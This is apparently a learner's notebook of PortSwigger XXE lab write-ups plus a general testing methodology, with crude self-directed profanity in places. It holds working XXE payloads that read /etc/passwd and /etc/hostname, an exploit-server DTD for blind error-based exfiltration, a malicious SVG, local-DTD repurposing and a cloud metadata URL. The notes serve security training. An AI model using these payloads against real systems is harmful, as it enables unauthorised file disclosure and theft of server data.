# labs
`http://169.254.169.254/`.

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]>
<root>
<foo>
&xxe;      <---------
</foo>
</root>
```



![[Pasted image 20240802132554.png]]

- check the error > tells you the end point you stupid fuck!

---



# Lab: Exploiting blind XXE to retrieve data via error messages

To retrieve abritray files from the server filesystem > must modify submitted XML in 2 different ways

1. introduce a `DOCTYPE` element that defines the external entitiy containing the path to the file
2. edit data value in the XML tha t

#### Solution

1. Click "Go to exploit server" and save the following malicious DTD file on your server:
    
    `<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>"> %eval; %exfil;`
    
    When imported, this page will read the contents of `/etc/passwd` into the `file` entity, and then try to use that entity in a file path.
    
2. Click "View exploit" and take a note of the URL for your malicious DTD.
3. You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
4. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
    
    `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`
    
    You should see an error message containing the contents of the `/etc/passwd` file.



![[Pasted image 20240802234243.png]]

- testing by trying to ping my sever 
- was blocked with message in response

> so we use a parameter entity to try to bypass 


![[Pasted image 20240802235018.png]]

- error in XML parser > exfiltrate  data from system 


![[Pasted image 20240802235950.png]]
- using the exploit server, we input the URL it gave us to get the error on the right


> The application outputs the error of the XML parser



Ex filtration of Data:
-------

> Create an entity within an entity ---> you can't use the >>%<< within the enclosed entity --> you have to use `&#x25; 



```
<!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval; 
%exfil;
```


-  trying to access file > but no file exsists > we are just trying to get us to throw the error


![[Pasted image 20240803001519.png]]

- after creating the parameter entity we stored it in our "exploit" server. 

```
<!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval; 
%exfil;
```

- then we went back to burp, and resent the request, with the exploit servers URL ( which is the URL from the exploit server in the lab )
	*NOTE: Hey dumb fuck --> it can't be a capital x --> &#x25;*



```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE anything [ <!ENTITY % xxe SYSTEM "https://exploit-0a47009703cd7b7086cfe8bc01a800dd.exploit-server.net/exploit"> %xxe; ]>
<stockCheck><productId>
1
</productId><storeId>1</storeId></stockCheck>
```



> so we are triggering an XML parser error, because its trying to retrieve a file that doesn't exists, but the vulnerability is that the error is giving sensitive info


---



# Lab: Exploiting XInclude to retrieve files

This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.

Because you don't control the entire XML document you can't define a DTD to launch a classic [XXE](https://portswigger.net/web-security/xxe) attack.

To solve the lab, inject an `XInclude` statement to retrieve the contents of the `/etc/passwd` file.



Hint:

By default, `XInclude` will try to parse the included document as XML. Since `/etc/passwd` isn't valid XML, you will need to add an extra attribute to the `XInclude` directive to change this behavior.



Soultion:

- Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
- Set the value of the `productId` parameter to:
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## Start Lab

> after checking all the intercepted traffic, there is no XML in request > So we have to inject XML characters to see how the application responds.

```
productId=%&storeId=1
```


- productId is vulnerable after testing it with an XML character

![[Pasted image 20240803004749.png]]
-  we see by the response that it is telling us --> entities not allowed


> the values from the parameters are being taken as XML document from the server side > in this case we need to use XInclude



> [!NOTE] XInclude
> XInclude: part of the XML specification > allows xml document to be created from sub components > to exploit --> reference xinclude name space and provide path to file you want to include --> /etc/passwd






![[Pasted image 20240803010354.png]]

- we use xinclude payload > be sure to leave a value after the parameter before the xinclude payload 

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```


---




# Lab: Exploiting XXE via image file upload


This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.

To solve the lab, upload an image that displays the contents of the `/etc/hostname` file after processing. Then use the "Submit solution" button to submit the value of the server hostname.

#### Hint
The SVG image format uses XML.

#### Solution

1. Create a local SVG image with the following content:
    
    `<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>`
2. Post a comment on a blog post, and upload this image as an avatar.
3. When you view your comment, you should see the contents of the `/etc/hostname` file in your image. Use the "Submit solution" button to submit the value of the server hostname.


## Start Lab



> [!NOTE] always look up technologies
> Look up --> Apache Batik library



1. look for places you can upload files
2. found -->  avatar upload profile pic 
3. create a blank SVG file
4. upload the blank SVG file to be sure it accepts it
5. insert malicious DTD in image, to see if application will process it



> [!NOTE] Step 5
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```




![[Pasted image 20240803014736.png]]

1. uploaded test.svg ( blank file )
2. after confirming it accepted > injected the malicious code in the /image parameter
3. went back to the blog after following the re-direct
4. saw that the comment was posted with some data ( small line imitating image )
5. open image new tab
6. the solution of the lab was there in the image

---



# Lab: Exploiting XXE to retrieve data by repurposing a local DTD --> expert 

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, trigger an error message containing the contents of the `/etc/passwd` file.

You'll need to reference an existing DTD file on the server and redefine an entity from it.


#### Hint

Systems using the GNOME desktop environment often have a DTD at `/usr/share/yelp/dtd/docbookx.dtd` containing an entity called `ISOamso.`


#### Solution

1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
2. Insert the following parameter entity definition in between the XML declaration and the `stockCheck` element:
    
    `<!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> <!ENTITY % ISOamso ' <!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval; &#x25;error; '> %local_dtd; ]>` This will import the Yelp DTD, then redefine the `ISOamso` entity, triggering an error message containing the contents of the `/etc/passwd` file.



## Start Lab


1. Find parameter in application that accepts XML input.

2. Test for regular entity by defining a [DTD] > try Parameter Entity if that doesn't work ( inject XML character in one of the parameters --> productID=1&)

```
<!DOCTYPE anything [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
```


> [!NOTE] #2 -> trying out regular & param entities
> If Application doesn't error our when trying regular, it is a good sign.
> Bad Sign: "doesn't accept external entities"



3. We got an ERROR when referencing the external entity. That is when we put -->  &xxe; 

```
<productId>
&xxe;
</productId>
```



4. Move on to Blind Regular Entity > by pinging our attacker controlled server


> [!NOTE] WHY the error in step 3? 
> If the application has some kind of defense in the back end that only outputs integers then we'll never see it in the response by using regular entities check




> [!NOTE] In Real World
> Would be using Burp Collab for this, but for the lab we are using the exploit server URL that they provide us 



5. Blind Regular Entity didn't work either -> "Invalid ProductId" > most likely doesn't allow reference to external entities > so now we move on to trying [parameter entity]

		note: might not have worked because they might have "egress" filitering
		so the server can't ping to an external domain



> [!NOTE] Param Entity
> Similar to regular entity > however 2 exceptions
> 1 . when referencing entity you have to use the percent sign --> %
> 2. Only referenced within the DTD & NOT outside of it



```
<!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://server_we_control.com"> %xxe;]>
```



> [!NOTE] DIFFERENT ERROR
> This time instead of "invalid parameter" > we get a "parsing error" > since application outputs the error of the parser, let's try to get contents from /etc/passwd > move on to step 6

 
6. Try re-purposing a local [DTD] 


> [!NOTE] Local DTD
> Check if error allows us to check if DTD exists on the system or not > you do this by calling a NONE exsisting DTD andif the error tells us if it exists or not > think back to the CBBH


```
<!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/fakefile"> %xxe;]>
```

#### BINGO --> Now we're cooking


> [!NOTE] The error we get is a good sign
> 1. It tells us that the XML is parsing Input
> 2. Might be able to tell us the contents of /etc/passwd


```
<!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>
```



> [!NOTE] Keep Digging
> Find a DTD that already exists on the server > there are common DTDs that you can look up online that you can try -> the "hint" in the lab already gives us a URL for this -> however, in RL you can google: [ gosecure dtd xxe ] > its a github: https://github.com/GoSecure/dtd-finder > FUZZ most common DTDs using XXE injection to see which is valid & which isn't valid > if we get 200 response it means DTD exsists > ALSO turn OFF url encoding in burp intruder when fuzzing

![[Pasted image 20240803150027.png]]



> [!NOTE] Next step after confirming DTD exsists
> 1. Over write an entity in this DTD and get the entity to error out & output the content of the Etsy passwd file
> 2. we can just copy the path ( from the hint ) and paste it in google > add "xxe injection" after the url path  
> - usr/share/yelp/dtd/docbookx.dtd xxe injection payloads
> 3. check to see if anyone had ever tried this already and can eat what they cooked ;) 
> hint: check [payloadallthethings] github


Here is the payload: 
```
<!DOCTYPE root [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">

    <!ENTITY % ISOamsa '
        <!ENTITY &#x25; file SYSTEM "file:///REPLACE_WITH_FILENAME_TO_READ">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
```

![[Pasted image 20240803154522.png]]

- solved 

Shout out to Garr
https://youtu.be/mAqY3OsVuE8

---


# Web/App Professional 


## Method: Exploiting blind XXE to retrieve data via error messages

1. Search for a parameter in the application that accepts an XML input
		example: checkstock


2. Test for a "Regular Entity"

```
<!DOCTYPE anything [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
```

NOTE: if blocked then try parameter entity (can only be referenced in the DTD itself)

`<!DOCTYPE anything [ <!ENTITY % xxe SYSTEM "http://127.0.0.1:8000"> %xxe; ]>`


---


## Method: Exploiting blind XXE to retrieve data via error messages


1. if there are no XML documents in the requests > try injecting XML characters in parameters > as seen in the first parameter below

```
productId=%&storeId=1
```

2. If we get back an XML error such as "external entities are not allowed" > good chance that the XML document is on server side > here we can try using --> **XInclude**


> [!NOTE] HackTricks
> [](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#xinclude)
> 
> XInclude
> 
> When integrating client data into server-side XML documents, like those in backend SOAP requests, direct control over the XML structure is often limited, hindering traditional XXE attacks due to restrictions on modifying the `DOCTYPE` element. However, an `XInclude` attack provides a solution by allowing the insertion of external entities within any data element of the XML document. This method is effective even when only a portion of the data within a server-generated XML document can be controlled.
> 
> To execute an `XInclude` attack, the `XInclude` namespace must be declared, and the file path for the intended external entity must be specified. Below is a succinct example of how such an attack can be formulated:
> 
> ```
> productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
> ```
> 
> Check [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) for more info!

---



## Method: Exploiting XXE via image file upload


1. look up if they are using any special libraries, think back too the portswigger lab --> Apache Batik library --> look it up in google or ImPu


> [!NOTE]  upload files --> /nah/web_app/upload_files/img
> SVG files use XML 


2. Check upload functionalities 

> [!NOTE] try uploading SVG into profile upload param.
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```



---

# Exploiting XXE to retrieve data by repurposing a local DTD


> [!NOTE] Reference Expert Lab & Greggs Video
> Check Resources


1. Try Regular entity 
2. Try Blind entity 
3. Try Param entity 
4. Try -->  repurposing local [DTD]



> [!NOTE] If : xml input exsists
> The reason we try blind before param this time is due to an XML input already exsisting



> [!NOTE] Real World
> **Real world example:** Systems using the GNOME desktop environment often have a DTD at `/usr/share/yelp/dtd/docbookx.dtd` containing an entity called `ISOamso`

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```



[[resources]]
- https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity



----------------

# General 

XXE vulnerability is a mis-configuration in the applications XML parser. 


- [DTD] allows declarations of external entities


---



# Remediation

1. Disable External Entities

